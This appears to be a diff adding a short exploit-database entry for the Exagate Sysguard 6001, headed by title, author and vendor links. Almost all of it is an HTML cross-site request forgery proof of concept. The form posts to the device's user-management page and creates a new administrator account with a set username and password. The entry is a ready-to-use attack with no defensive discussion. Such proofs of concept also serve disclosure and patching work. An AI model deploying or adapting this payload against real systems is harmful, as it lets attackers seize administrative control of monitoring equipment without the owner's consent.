@@ -1,0 +1,19 @@
+# Exploit Title: Exagate Sysguard 6001 - Cross-Site Request Forgery (Add Admin)
+# Exploit Author: Metin Yunus Kandemir
+# Vendor Homepage: https://www.exagate.com/
+# Software Link: https://www.exagate.com/sysguard-6001
+# Version: SYSGuard 6001
+
+HTML CSRF PoC :
+
+<html>
+  <body>
+    <form action="http://target/kulyon.php" method="POST">
+      <input type="hidden" name="username" value="joke" />
+      <input type="hidden" name="password" value="159384" />
+      <input type="hidden" name="privilege" value="0" />
+      <input type="hidden" name="button" value="Ekle" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
